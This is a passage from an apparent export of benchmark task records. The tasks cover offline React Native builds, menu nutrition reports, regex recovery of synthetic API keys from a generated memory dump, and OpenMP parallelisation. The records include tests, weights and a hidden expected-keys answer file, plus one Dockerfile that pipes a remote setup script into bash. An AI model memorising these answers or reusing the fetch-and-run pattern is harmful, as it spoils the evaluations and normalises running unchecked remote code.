\""researchers\"": [],\n        \""total_publications\"": len(publications),\n        \""total_citations\"": len(citations)\n    }\n    \n    # Process each researcher\n    for _, researcher in researchers.iterrows():\n        researcher_pubs = []\n        for _, pub in publications.iterrows():\n            if researcher['researcher_id'] in pub['authors'].split(';'):\n                researcher_pubs.append(pub['doi'])\n        \n        # Calculate h-index for this researcher\n        h_index = 0  # Placeholder\n        \n        researcher_data = {\n            \""id\"": researcher['researcher_id'],\n            \""name\"": researcher['name'],\n            \""affiliation\"": researcher['affiliation'],\n            \""field\"": researcher['field'],\n            \""publication_count\"": len(researcher_pubs),\n            \""h_index\"": h_index,\n            \""publications\"": researcher_pubs\n        }\n        report[\""researchers\""].append(researcher_data)\n    \n    return report\n\ndef main():\n    publications, citations, researchers = load_data()\n    report = generate_report(publications, citations, researchers)\n    \n    with open('impact_report.json', 'w') as f:\n        json.dump(report, f, indent=2)\n    \n    print(\""Research impact report generated successfully!\"")\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-23T09:12:55.077417+00:00,2025-07-23T11:19:10.632169+00:00
draft_dp_ed0476d6,medium,draft_dp_ed0476d6,software-engineering,The React Native builds are failing when devs go offline. Set up Verdaccio npm registry and configure Gradle to use local Maven repos so our RN Android app can build completely offline.,software-engineering,build-automation|package-management|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install dependencies including Java 11 and Node.js
RUN apt-get update && apt-get install -y \
    openjdk-11-jdk \
    curl \
    wget \
    unzip \
    git \
    build-essential \
    python3 \
    && rm -rf /var/lib/apt/lists/*

# Install Node.js 18
RUN curl -fsSL https://deb.nodesource.com/setup_18.x | bash - && \
    apt-get install -y nodejs

# Set Java environment
ENV JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
ENV PATH=$JAVA_HOME/bin:$PATH

# Install Android SDK (simplified - just command line tools)
ENV ANDROID_HOME=/opt/android-sdk
ENV PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools

RUN mkdir -p $ANDROID_HOME/cmdline-tools && \
    cd $ANDROID_HOME && \
    wget -q https://dl.google.com/android/repository/commandlinetools-linux-8512546_latest.zip && \
    unzip -q commandlinetools-linux-8512546_latest.zip && \
    mkdir -p cmdline-tools/latest && \
    mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true && \
    rm commandlinetools-linux-8512546_latest.zip

# Create working directory
WORKDIR /workspace

# Copy all project files
COPY package.json /workspace/
COPY verdaccio-config.yaml /workspace/
COPY MyApp /workspace/MyApp/
COPY setup_offline.sh /workspace/

# Make scripts executable
RUN chmod +x setup_offline.sh

# Install npm packages for the workspace (verdaccio)
RUN npm install

# Set npm prefix for global installs
RUN npm config set prefix /workspace/.npm-global
ENV PATH=/workspace/.npm-global/bin:$PATH

CMD [""/bin/bash""]","import subprocess
import os
import socket

def test_verdaccio_registry_running():
    """"""Test that Verdaccio npm registry is running on port 4873""""""
    # Check if Verdaccio is listening on port 4873
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(('localhost', 4873))
        sock.close()
        assert result == 0, ""Verdaccio is not running on port 4873""
    except Exception as e:
        assert False, f""Failed to check Verdaccio: {str(e)}""
    
    # Verify npm is configured to use local registry
    result = subprocess.run(['npm', 'config', 'get', 'registry'], 
                          capture_output=True, text=True)
    assert result.returncode == 0, ""Failed to get npm registry config""
    assert ""localhost:4873"" in result.stdout or ""127.0.0.1:4873"" in result.stdout, \
        f""npm is not configured to use local registry. Current registry: {result.stdout.strip()}""

def test_gradle_offline_configuration():
    """"""Test that Gradle is configured for offline builds with local Maven repos""""""
    # Check if gradle properties has offline configuration
    gradle_props = ""/workspace/MyApp/android/gradle.properties""
    assert os.path.exists(gradle_props), ""gradle.properties not found""
    
    # Check if offline gradle config exists
    gradle_config = ""/workspace/.gradle/init.gradle""
    assert os.path.exists(gradle_config), ""Gradle init script for offline mode not found""
    
    # Verify the init script contains local repository configuration
    with open(gradle_config, 'r') as f:
        content = f.read()
        assert ""mavenLocal()"" in content or ""maven { url"" in content, \
            ""Gradle not configured with local Maven repository""
    
    # Test that gradle wrapper is executable and configured
    gradlew_path = ""/workspace/MyApp/android/gradlew""
    assert os.path.exists(gradlew_path), ""gradlew not found""
    assert os.access(gradlew_path, os.X_OK), ""gradlew is not executable""","{""test_verdaccio_registry_running"": 0.5, ""test_gradle_offline_configuration"": 0.5}","{""setup_offline.sh"": ""#!/bin/bash\n# Script to set up offline build environment\n\n# Start Verdaccio in background\nnpm run start-verdaccio &\nVERDACCIO_PID=$!\n\n# Wait for Verdaccio to start\necho \""Waiting for Verdaccio to start...\""\nfor i in {1..30}; do\n    if curl -s http://localhost:4873 > /dev/null; then\n        echo \""Verdaccio is running!\""\n        break\n    fi\n    sleep 1\ndone\n\n# Configure npm to use local registry\nnpm config set registry http://localhost:4873/\n\n# Create gradle init script for offline mode\nmkdir -p ~/.gradle\ncat > ~/.gradle/init.gradle << 'EOF'\nallprojects {\n    repositories {\n        mavenLocal()\n        maven { url = uri(\""file:///workspace/.m2/repository\"") }\n    }\n    \n    buildscript {\n        repositories {\n            mavenLocal()\n            maven { url = uri(\""file:///workspace/.m2/repository\"") }\n        }\n    }\n}\n\nsettingsEvaluated { settings ->\n    settings.pluginManagement {\n        repositories {\n            mavenLocal()\n            maven { url = uri(\""file:///workspace/.m2/repository\"") }\n        }\n    }\n}\nEOF\n\necho \""Offline build environment configured!\"""", ""verdaccio-config.yaml"": ""# Verdaccio configuration for offline npm registry\nstorage: ./storage\nplugins: ./plugins\n\nweb:\n  title: Verdaccio\n\nauth:\n  htpasswd:\n    file: ./htpasswd\n\nuplinks:\n  npmjs:\n    url: https://registry.npmjs.org/\n    maxage: 60m\n\npackages:\n  '@*/*':\n    access: $all\n    publish: $authenticated\n    unpublish: $authenticated\n    proxy: npmjs\n\n  '**':\n    access: $all\n    publish: $authenticated\n    unpublish: $authenticated\n    proxy: npmjs\n\nserver:\n  keepAliveTimeout: 60\n\nmiddlewares:\n  audit:\n    enabled: true\n\nlogs:\n  - {type: stdout, format: pretty, level: http}"", ""package.json"": ""{\n  \""name\"": \""rn-offline-workspace\"",\n  \""version\"": \""1.0.0\"",\n  \""description\"": \""React Native offline build workspace\"",\n  \""scripts\"": {\n    \""start-verdaccio\"": \""verdaccio --config verdaccio-config.yaml\""\n  },\n  \""devDependencies\"": {\n    \""verdaccio\"": \""^5.29.2\""\n  }\n}"", ""MyApp/app.json"": ""{\n  \""name\"": \""MyApp\"",\n  \""displayName\"": \""MyApp\""\n}"", ""MyApp/index.js"": ""import {AppRegistry} from 'react-native';\nimport App from './App';\nimport {name as appName} from './app.json';\n\nAppRegistry.registerComponent(appName, () => App);"", ""MyApp/package.json"": ""{\n  \""name\"": \""MyApp\"",\n  \""version\"": \""0.0.1\"",\n  \""private\"": true,\n  \""scripts\"": {\n    \""android\"": \""react-native run-android\"",\n    \""ios\"": \""react-native run-ios\"",\n    \""start\"": \""react-native start\"",\n    \""test\"": \""jest\"",\n    \""lint\"": \""eslint .\""\n  },\n  \""dependencies\"": {\n    \""react\"": \""18.2.0\"",\n    \""react-native\"": \""0.72.6\"",\n    \""@react-navigation/native\"": \""^6.1.9\"",\n    \""react-native-vector-icons\"": \""^10.0.0\"",\n    \""@react-native-async-storage/async-storage\"": \""^1.19.3\""\n  },\n  \""devDependencies\"": {\n    \""@babel/core\"": \""^7.20.0\"",\n    \""@babel/preset-env\"": \""^7.20.0\"",\n    \""@babel/runtime\"": \""^7.20.0\"",\n    \""@react-native/eslint-config\"": \""^0.72.2\"",\n    \""@react-native/metro-config\"": \""^0.72.11\"",\n    \""@tsconfig/react-native\"": \""^3.0.0\"",\n    \""babel-jest\"": \""^29.2.1\"",\n    \""eslint\"": \""^8.19.0\"",\n    \""jest\"": \""^29.2.1\"",\n    \""metro-react-native-babel-preset\"": \""0.76.8\"",\n    \""react-test-renderer\"": \""18.2.0\""\n  },\n  \""engines\"": {\n    \""node\"": \"">=16\""\n  }\n}"", ""MyApp/App.js"": ""import React from 'react';\nimport {\n  SafeAreaView,\n  ScrollView,\n  StatusBar,\n  StyleSheet,\n  Text,\n  useColorScheme,\n  View,\n} from 'react-native';\n\nfunction App() {\n  const isDarkMode = useColorScheme() === 'dark';\n\n  return (\n    <SafeAreaView style={styles.container}>\n      <StatusBar barStyle={isDarkMode ? 'light-content' : 'dark-content'} />\n      <ScrollView contentInsetAdjustmentBehavior=\""automatic\"">\n        <View style={styles.content}>\n          <Text style={styles.title}>MyApp</Text>\n          <Text style={styles.subtitle}>React Native Offline Build Test</Text>\n        </View>\n      </ScrollView>\n    </SafeAreaView>\n  );\n}\n\nconst styles = StyleSheet.create({\n  container: {\n    flex: 1,\n  },\n  content: {\n    padding: 24,\n    alignItems: 'center',\n  },\n  title: {\n    fontSize: 32,\n    fontWeight: '600',\n  },\n  subtitle: {\n    marginTop: 8,\n    fontSize: 18,\n    fontWeight: '400',\n  },\n});\n\nexport default App;"", ""MyApp/android/gradlew"": ""#!/bin/sh\n\nDIRNAME=`dirname \""$0\""`\nAPP_BASE_NAME=`basename \""$0\""`\nAPP_HOME=$DIRNAME\n\n# Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.\nDEFAULT_JVM_OPTS='\""-Xmx64m\"" \""-Xms64m\""'\n\n# Use the maximum available, or set MAX_FD != -1 to use that value.\nMAX_FD=\""maximum\""\n\n# Determine the Java command to use to start the JVM.\nif [ -n \""$JAVA_HOME\"" ] ; then\n    if [ -x \""$JAVA_HOME/jre/sh/java\"" ] ; then\n        JAVACMD=\""$JAVA_HOME/jre/sh/java\""\n    else\n        JAVACMD=\""$JAVA_HOME/bin/java\""\n    fi\n    if [ ! -x \""$JAVACMD\"" ] ; then\n        die \""ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME\""\n    fi\nelse\n    JAVACMD=\""java\""\nfi\n\n# Increase the maximum file descriptors if we can.\nif [ \""$cygwin\"" = \""false\"" -a \""$darwin\"" = \""false\"" -a \""$nonstop\"" = \""false\"" ] ; then\n    MAX_FD_LIMIT=`ulimit -H -n`\n    if [ $? -eq 0 ] ; then\n        if [ \""$MAX_FD\"" = \""maximum\"" -o \""$MAX_FD\"" = \""max\"" ] ; then\n            MAX_FD=\""$MAX_FD_LIMIT\""\n        fi\n        ulimit -n $MAX_FD\n        if [ $? -ne 0 ] ; then\n            warn \""Could not set maximum file descriptor limit: $MAX_FD\""\n        fi\n    else\n        warn \""Could not query maximum file descriptor limit: $MAX_FD_LIMIT\""\n    fi\nfi\n\n# Escape application args\nsave () {\n    for i do printf %s\\\\n \""$i\"" | sed \""s/'/'\\\\\\\\''/g;1s/^/'/;\\$s/\\$/' \\\\\\\\/\"" ; done\n    echo \"" \""\n}\nAPP_ARGS=`save \""$@\""`\n\n# Collect all arguments for the java command, following the shell quoting and substitution rules\neval set -- $DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS '\""-Dorg.gradle.appname=$APP_BASE_NAME\""' -classpath '\""$CLASSPATH\""' org.gradle.wrapper.GradleWrapperMain \""$APP_ARGS\""\n\nexec \""$JAVACMD\"" \""$@\"""", ""MyApp/android/build.gradle"": ""buildscript {\n    ext {\n        buildToolsVersion = \""33.0.0\""\n        minSdkVersion = 21\n        compileSdkVersion = 33\n        targetSdkVersion = 33\n        ndkVersion = \""23.1.7779620\""\n    }\n    repositories {\n        google()\n        mavenCentral()\n    }\n    dependencies {\n        classpath(\""com.android.tools.build:gradle:7.3.1\"")\n    }\n}\n\nallprojects {\n    repositories {\n        google()\n        mavenCentral()\n        maven { url \""https://www.jitpack.io\"" }\n    }\n}"", ""MyApp/android/gradle.properties"": ""org.gradle.jvmargs=-Xmx2048m -XX:MaxPermSize=512m -XX:+HeapDumpOnOutOfMemoryError -Dfile.encoding=UTF-8\nandroid.useAndroidX=true\nandroid.enableJetifier=true\nnewArchEnabled=false\nhermesEnabled=true"", ""MyApp/android/settings.gradle"": ""rootProject.name = 'MyApp'\napply from: file(\""../node_modules/@react-native-community/cli-platform-android/native_modules.gradle\""); applyNativeModulesSettingsGradle(settings)\ninclude ':app'"", ""MyApp/android/app/build.gradle"": ""apply plugin: \""com.android.application\""\napply plugin: \""com.facebook.react\""\n\ndef enableProguardInReleaseBuilds = false\ndef jscFlavor = 'org.webkit:android-jsc:+'\n\nandroid {\n    ndkVersion rootProject.ext.ndkVersion\n    compileSdkVersion rootProject.ext.compileSdkVersion\n\n    namespace \""com.myapp\""\n    defaultConfig {\n        applicationId \""com.myapp\""\n        minSdkVersion rootProject.ext.minSdkVersion\n        targetSdkVersion rootProject.ext.targetSdkVersion\n        versionCode 1\n        versionName \""1.0\""\n    }\n    signingConfigs {\n        debug {\n            storeFile file('debug.keystore')\n            storePassword 'android'\n            keyAlias 'androiddebugkey'\n            keyPassword 'android'\n        }\n    }\n    buildTypes {\n        debug {\n            signingConfig signingConfigs.debug\n        }\n        release {\n            signingConfig signingConfigs.debug\n            minifyEnabled enableProguardInReleaseBuilds\n            proguardFiles getDefaultProguardFile(\""proguard-android.txt\""), \""proguard-rules.pro\""\n        }\n    }\n}\n\ndependencies {\n    implementation(\""com.facebook.react:react-android\"")\n    debugImplementation(\""com.facebook.flipper:flipper:0.182.0\"") {\n        exclude group:'com.squareup.okhttp3', module:'okhttp'\n    }\n    debugImplementation(\""com.facebook.flipper:flipper-network-plugin:0.182.0\"") {\n        exclude group:'com.squareup.okhttp3', module:'okhttp'\n    }\n    debugImplementation(\""com.facebook.flipper:flipper-fresco-plugin:0.182.0\"")\n\n    if (hermesEnabled.toBoolean()) {\n        implementation(\""com.facebook.react:hermes-android\"")\n    } else {\n        implementation jscFlavor\n    }\n}\n\napply from: file(\""../../node_modules/@react-native-community/cli-platform-android/native_modules.gradle\""); applyNativeModulesAppBuildGradle(project)"", ""MyApp/android/app/src/main/AndroidManifest.xml"": ""<manifest xmlns:android=\""http://schemas.android.com/apk/res/android\"">\n\n    <uses-permission android:name=\""android.permission.INTERNET\"" />\n\n    <application\n      android:name=\"".MainApplication\""\n      android:label=\""@string/app_name\""\n      android:icon=\""@mipmap/ic_launcher\""\n      android:roundIcon=\""@mipmap/ic_launcher_round\""\n      android:allowBackup=\""false\""\n      android:theme=\""@style/AppTheme\"">\n      <activity\n        android:name=\"".MainActivity\""\n        android:label=\""@string/app_name\""\n        android:configChanges=\""keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode\""\n        android:launchMode=\""singleTask\""\n        android:windowSoftInputMode=\""adjustResize\""\n        android:exported=\""true\"">\n        <intent-filter>\n            <action android:name=\""android.intent.action.MAIN\"" />\n            <category android:name=\""android.intent.category.LAUNCHER\"" />\n        </intent-filter>\n      </activity>\n    </application>\n</manifest>"", ""MyApp/android/app/src/main/res/values/styles.xml"": ""<resources>\n    <style name=\""AppTheme\"" parent=\""Theme.AppCompat.DayNight.NoActionBar\"">\n        <item name=\""android:editTextBackground\"">@drawable/rn_edit_text_material</item>\n    </style>\n</resources>"", ""MyApp/android/app/src/main/res/values/strings.xml"": ""<resources>\n    <string name=\""app_name\"">MyApp</string>\n</resources>"", ""MyApp/android/app/src/main/java/com/myapp/MainApplication.java"": ""package com.myapp;\n\nimport android.app.Application;\nimport com.facebook.react.PackageList;\nimport com.facebook.react.ReactApplication;\nimport com.facebook.react.ReactNativeHost;\nimport com.facebook.react.ReactPackage;\nimport com.facebook.react.defaults.DefaultNewArchitectureEntryPoint;\nimport com.facebook.react.defaults.DefaultReactNativeHost;\nimport com.facebook.soloader.SoLoader;\nimport java.util.List;\n\npublic class MainApplication extends Application implements ReactApplication {\n\n  private final ReactNativeHost mReactNativeHost =\n      new DefaultReactNativeHost(this) {\n        @Override\n        public boolean getUseDeveloperSupport() {\n          return BuildConfig.DEBUG;\n        }\n\n        @Override\n        protected List<ReactPackage> getPackages() {\n          @SuppressWarnings(\""UnnecessaryLocalVariable\"")\n          List<ReactPackage> packages = new PackageList(this).getPackages();\n          return packages;\n        }\n\n        @Override\n        protected String getJSMainModuleName() {\n          return \""index\"";\n        }\n\n        @Override\n        protected boolean isNewArchEnabled() {\n          return BuildConfig.IS_NEW_ARCHITECTURE_ENABLED;\n        }\n\n        @Override\n        protected Boolean isHermesEnabled() {\n          return BuildConfig.IS_HERMES_ENABLED;\n        }\n      };\n\n  @Override\n  public ReactNativeHost getReactNativeHost() {\n    return mReactNativeHost;\n  }\n\n  @Override\n  public void onCreate() {\n    super.onCreate();\n    SoLoader.init(this, /* native exopackage */ false);\n    if (BuildConfig.IS_NEW_ARCHITECTURE_ENABLED) {\n      DefaultNewArchitectureEntryPoint.load();\n    }\n  }\n}"", ""MyApp/android/app/src/main/java/com/myapp/MainActivity.java"": ""package com.myapp;\n\nimport com.facebook.react.ReactActivity;\nimport com.facebook.react.ReactActivityDelegate;\nimport com.facebook.react.defaults.DefaultNewArchitectureEntryPoint;\nimport com.facebook.react.defaults.DefaultReactActivityDelegate;\n\npublic class MainActivity extends ReactActivity {\n\n  @Override\n  protected String getMainComponentName() {\n    return \""MyApp\"";\n  }\n\n  @Override\n  protected ReactActivityDelegate createReactActivityDelegate() {\n    return new DefaultReactActivityDelegate(\n        this,\n        getMainComponentName(),\n        DefaultNewArchitectureEntryPoint.getFabricEnabled());\n  }\n}"", ""MyApp/android/gradle/wrapper/gradle-wrapper.properties"": ""distributionBase=GRADLE_USER_HOME\ndistributionPath=wrapper/dists\ndistributionUrl=https\\://services.gradle.org/distributions/gradle-7.5.1-all.zip\nnetworkTimeout=10000\nzipStoreBase=GRADLE_USER_HOME\nzipStorePath=wrapper/dists""}",2025-07-23T08:59:41.951681+00:00,2025-07-23T11:22:52.069688+00:00
draft_dp_4f45c94c,medium,draft_dp_4f45c94c,data-processing,Need to consolidate our restaurant chain's menu data from the CSV files into a single JSON report. Calculate nutritional info for each dish based on ingredients and flag any allergens. Output should follow the menu_schema.json format.,data-processing,python|data-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /restaurant_data

# Copy all data files
COPY locations.csv /restaurant_data/
COPY menu_items.csv /restaurant_data/
COPY ingredients.csv /restaurant_data/
COPY recipes.csv /restaurant_data/
COPY menu_schema.json /restaurant_data/

# Install required packages
RUN pip install pandas jsonschema

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_menu_report_exists_and_valid():
    """"""Test that menu_report.json exists and follows the schema""""""
    # Check if the report exists
    assert os.path.exists('/restaurant_data/menu_report.json'), ""menu_report.json not found""
    
    # Validate against schema
    result = subprocess.run(
        ['python', '-c', '''
import json
import jsonschema

with open(""/restaurant_data/menu_report.json"") as f:
    report = json.load(f)
with open(""/restaurant_data/menu_schema.json"") as f:
    schema = json.load(f)

jsonschema.validate(report, schema)
print(""Valid"")
'''],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Schema validation failed: {result.stderr}""
    assert ""Valid"" in result.stdout

def test_nutritional_calculations_correct():
    """"""Test that nutritional info is correctly calculated for Classic Burger""""""
    with open('/restaurant_data/menu_report.json') as f:
        report = json.load(f)
    
    # Find Classic Burger in the report
    burger = next((item for item in report['menu_items'] if item['item_id'] == 'MENU001'), None)
    assert burger is not None, ""Classic Burger not found in report""
    
    # Expected nutritional values for Classic Burger:
    # 150g beef (375 cal), 80g bun (212 cal), 20g lettuce (3 cal), 
    # 30g tomato (5.4 cal), 30g cheese (120.6 cal) = 716 calories
    expected_calories = 716
    
    # Allow small rounding differences
    assert abs(burger['nutritional_info']['calories'] - expected_calories) < 1, \
        f""Expected ~{expected_calories} calories, got {burger['nutritional_info']['calories']}""
    
    # Check allergens are detected (should have gluten from bun and dairy from cheese)
    assert 'gluten' in burger['allergens'], ""Gluten allergen not detected""
    assert 'dairy' in burger['allergens'], ""Dairy allergen not detected""","{""test_menu_report_exists_and_valid"": 0.4, ""test_nutritional_calculations_correct"": 0.6}","{""menu_schema.json"": ""{\n  \""$schema\"": \""http://json-schema.org/draft-07/schema#\"",\n  \""type\"": \""object\"",\n  \""required\"": [\""menu_items\"", \""summary\""],\n  \""properties\"": {\n    \""menu_items\"": {\n      \""type\"": \""array\"",\n      \""items\"": {\n        \""type\"": \""object\"",\n        \""required\"": [\""item_id\"", \""name\"", \""category\"", \""base_price\"", \""nutritional_info\"", \""allergens\"", \""available_locations\""],\n        \""properties\"": {\n          \""item_id\"": {\""type\"": \""string\""},\n          \""name\"": {\""type\"": \""string\""},\n          \""category\"": {\""type\"": \""string\""},\n          \""base_price\"": {\""type\"": \""number\""},\n          \""nutritional_info\"": {\n            \""type\"": \""object\"",\n            \""required\"": [\""calories\"", \""protein_g\"", \""fat_g\"", \""carbs_g\""],\n            \""properties\"": {\n              \""calories\"": {\""type\"": \""number\""},\n              \""protein_g\"": {\""type\"": \""number\""},\n              \""fat_g\"": {\""type\"": \""number\""},\n              \""carbs_g\"": {\""type\"": \""number\""}\n            }\n          },\n          \""allergens\"": {\n            \""type\"": \""array\"",\n            \""items\"": {\""type\"": \""string\""}\n          },\n          \""available_locations\"": {\n            \""type\"": \""array\"",\n            \""items\"": {\""type\"": \""string\""}\n          }\n        }\n      }\n    },\n    \""summary\"": {\n      \""type\"": \""object\"",\n      \""required\"": [\""total_items\"", \""allergen_counts\""],\n      \""properties\"": {\n        \""total_items\"": {\""type\"": \""integer\""},\n        \""allergen_counts\"": {\n          \""type\"": \""object\"",\n          \""additionalProperties\"": {\""type\"": \""integer\""}\n        }\n      }\n    }\n  }\n}"", ""ingredients.csv"": ""ingredient_id,name,allergens,calories_per_100g,protein_per_100g,fat_per_100g,carbs_per_100g\nING001,Beef Patty,none,250,26,15,0\nING002,Burger Bun,gluten,265,9,4,49\nING003,Lettuce,none,15,1.4,0.2,2.9\nING004,Tomato,none,18,0.9,0.2,3.9\nING005,Cheese,dairy,402,25,33,1.3\nING006,Caesar Dressing,dairy;egg,458,2,48,4\nING007,Romaine Lettuce,none,17,1.2,0.3,3.3\nING008,Croutons,gluten,400,10,15,60\nING009,Chicken Breast,none,165,31,3.6,0\nING010,Whole Wheat Tortilla,gluten,218,8,5,36\nING011,Mixed Vegetables,none,25,1.5,0.3,5\nING012,Fish Fillet,fish,206,22,12,0\nING013,Corn Tortilla,none,218,5.7,2.9,44.6\nING014,Potato,none,77,2,0.1,17\nING015,Chocolate,dairy,546,4.9,31,52\nING016,Flour,gluten,364,10,1,76\nING017,Eggs,egg,155,13,11,1.1"", ""locations.csv"": ""location_id,name,region,type\nLOC001,Downtown Bistro,North,restaurant\nLOC002,Mall Food Court,North,kiosk\nLOC003,Airport Express,South,kiosk\nLOC004,Westside Grill,West,restaurant\nLOC005,Beach Location,South,restaurant"", ""recipes.csv"": ""menu_item_id,ingredient_id,quantity_grams\nMENU001,ING001,150\nMENU001,ING002,80\nMENU001,ING003,20\nMENU001,ING004,30\nMENU001,ING005,30\nMENU002,ING007,100\nMENU002,ING006,40\nMENU002,ING008,30\nMENU003,ING009,150\nMENU003,ING002,80\nMENU003,ING003,20\nMENU003,ING004,30\nMENU004,ING010,60\nMENU004,ING011,150\nMENU005,ING012,120\nMENU005,ING013,60\nMENU005,ING003,20\nMENU005,ING004,30\nMENU006,ING014,200\nMENU007,ING015,60\nMENU007,ING016,40\nMENU007,ING017,50"", ""menu_items.csv"": ""item_id,name,category,base_price,available_locations\nMENU001,Classic Burger,main,12.99,LOC001;LOC004;LOC005\nMENU002,Caesar Salad,salad,9.99,LOC001;LOC002;LOC003;LOC004;LOC005\nMENU003,Grilled Chicken Sandwich,main,11.99,LOC001;LOC002;LOC004\nMENU004,Veggie Wrap,main,10.99,LOC001;LOC002;LOC003;LOC004;LOC005\nMENU005,Fish Tacos,main,13.99,LOC005\nMENU006,French Fries,side,4.99,LOC001;LOC002;LOC003;LOC004;LOC005\nMENU007,Chocolate Cake,dessert,6.99,LOC001;LOC004;LOC005""}",2025-07-23T09:44:26.433598+00:00,2025-07-23T09:44:26.463197+00:00
draft_dp_9b12f305,hard,draft_dp_9b12f305,security,"Service crashed and took our API keys with it. Need to extract all the API keys from the memory dump at /data/service_memory.dump - they start with prefixes like sk_live_, pk_test_, api_key_, or token_ followed by 32-48 alphanumeric chars. Save them to /data/recovered_keys.txt one per line.",security,forensics|data-extraction|pattern-recognition,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /data

# Install memory forensics tools
RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    python3-pytest \
    binutils \
    bsdmainutils \
    grep \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Copy the memory dump generator
COPY generate_memory_dump.py /tmp/

# Generate the memory dump
RUN python3 /tmp/generate_memory_dump.py && \
    rm /tmp/generate_memory_dump.py

# The memory dump is now at /data/service_memory.dump
# The expected keys are at /data/.expected_keys (hidden file for testing)","import os
import re

def test_recovered_keys_file_exists():
    """"""Test that the recovered keys file was created.""""""
    assert os.path.exists('/data/recovered_keys.txt'), ""recovered_keys.txt file not found""

def test_all_valid_keys_recovered():
    """"""Test that all valid API keys were extracted from the memory dump.""""""
    # Read the expected keys (hidden file created during dump generation)
    with open('/data/.expected_keys', 'r') as f:
        expected_keys = set(line.strip() for line in f if line.strip())
    
    # Read the recovered keys
    assert os.path.exists('/data/recovered_keys.txt'), ""recovered_keys.txt not found""
    with open('/data/recovered_keys.txt', 'r') as f:
        recovered_keys = set(line.strip() for line in f if line.strip())
    
    # Check that all expected keys were recovered
    missing_keys = expected_keys - recovered_keys
    assert len(missing_keys) == 0, f""Missing {len(missing_keys)} keys: {missing_keys}""
    
    # Verify each recovered key matches the expected pattern
    pattern = re.compile(r'^(sk_live_|pk_test_|api_key_|token_)[a-zA-Z0-9]{32,48}$')
    for key in recovered_keys:
        assert pattern.match(key), f""Invalid key format: {key}""","{""test_recovered_keys_file_exists"": 0.2, ""test_all_valid_keys_recovered"": 0.8}","{""generate_memory_dump.py"": ""#!/usr/bin/env python3\nimport random\nimport string\nimport struct\n\ndef generate_random_data(size):\n    \""\""\""Generate random binary data.\""\""\""\n    return bytes(random.randint(0, 255) for _ in range(size))\n\ndef generate_api_key(prefix, length):\n    \""\""\""Generate a valid API key with given prefix and length.\""\""\""\n    chars = string.ascii_letters + string.digits\n    key_body = ''.join(random.choice(chars) for _ in range(length))\n    return f\""{prefix}{key_body}\""\n\ndef corrupt_string(s, corruption_rate=0.3):\n    \""\""\""Randomly corrupt a string to simulate partial memory.\""\""\""\n    if random.random() < corruption_rate:\n        # Truncate\n        cut_point = random.randint(len(s)//2, len(s)-1)\n        return s[:cut_point]\n    return s\n\n# Valid API keys to hide in the dump\nvalid_keys = [\n    generate_api_key(\""sk_live_\"", 32),\n    generate_api_key(\""sk_live_\"", 48),\n    generate_api_key(\""pk_test_\"", 32),\n    generate_api_key(\""pk_test_\"", 40),\n    generate_api_key(\""api_key_\"", 36),\n    generate_api_key(\""api_key_\"", 44),\n    generate_api_key(\""token_\"", 32),\n    generate_api_key(\""token_\"", 48),\n]\n\n# Some fake/invalid patterns to include as noise\nfake_patterns = [\n    \""sk_test_12345\"",  # Too short\n    \""pk_live_\"" + \""x\"" * 60,  # Too long\n    \""api_key\"" + \""a\"" * 32,  # Missing underscore\n    \""token-\"" + \""b\"" * 32,  # Wrong separator\n    corrupt_string(generate_api_key(\""sk_live_\"", 32)),  # Truncated\n    corrupt_string(generate_api_key(\""api_key_\"", 40)),  # Truncated\n]\n\n# Create memory dump\nwith open('/data/service_memory.dump', 'wb') as f:\n    # Write some initial random data\n    f.write(generate_random_data(random.randint(1000, 5000)))\n    \n    # Mix in valid keys with random data\n    for key in valid_keys:\n        # Add some random data before\n        f.write(generate_random_data(random.randint(100, 1000)))\n        \n        # Sometimes add the key in different encodings\n        if random.random() < 0.7:\n            # UTF-8 encoded\n            f.write(key.encode('utf-8'))\n        else:\n            # UTF-16 encoded (less common but possible)\n            f.write(key.encode('utf-16'))\n        \n        # Sometimes add null terminators\n        if random.random() < 0.5:\n            f.write(b'\\x00')\n    \n    # Add more random data\n    f.write(generate_random_data(random.randint(2000, 8000)))\n    \n    # Add fake patterns\n    for fake in fake_patterns:\n        f.write(generate_random_data(random.randint(50, 200)))\n        f.write(fake.encode('utf-8'))\n        if random.random() < 0.3:\n            f.write(b'\\x00')\n    \n    # Add some JSON-like structures with keys\n    json_like = f'{{\""api_key\"": \""{valid_keys[4]}\"", \""status\"": \""active\""}}'.encode()\n    f.write(generate_random_data(random.randint(100, 500)))\n    f.write(json_like)\n    \n    # Add some log-like entries\n    log_entry = f'[2024-01-15 14:23:45] AUTH: Using key {valid_keys[2]}\\n'.encode()\n    f.write(generate_random_data(random.randint(200, 800)))\n    f.write(log_entry)\n    \n    # Final random data\n    f.write(generate_random_data(random.randint(5000, 10000)))\n\n# Save the valid keys for test verification\nwith open('/data/.expected_keys', 'w') as f:\n    for key in sorted(valid_keys):\n        f.write(key + '\\n')\n\nprint(f\""Memory dump created at /data/service_memory.dump\"")\nprint(f\""Hidden {len(valid_keys)} valid API keys in the dump\"")""}",2025-07-23T09:43:08.368328+00:00,2025-07-23T09:47:36.381176+00:00
draft_dp_e37c3a81,hard,draft_dp_e37c3a81,scientific-computing,The Monte Carlo option pricer is too slow with large simulations. Need to parallelize it with OpenMP - should get at least 3x speedup on 8 cores while keeping results within 0.1% of the serial version.,scientific-computing,C|parallel-computing|optimization,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    g++ \
    make \
    libomp-dev \
    time \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY Makefile /app/
COPY monte_carlo_pricer.cpp /app/
